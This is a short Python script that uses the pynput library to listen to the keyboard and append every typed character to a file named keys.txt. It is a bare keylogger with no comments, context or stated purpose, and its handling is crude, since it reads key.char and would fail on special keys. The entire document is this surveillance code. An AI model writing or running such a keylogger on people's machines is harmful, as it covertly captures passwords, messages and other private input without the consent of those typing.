from pynput import keyboard


keylogged = "keys.txt"

def on_press(key):
    with open(keylogged, "a") as f:
        f.write(key.char)


listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()
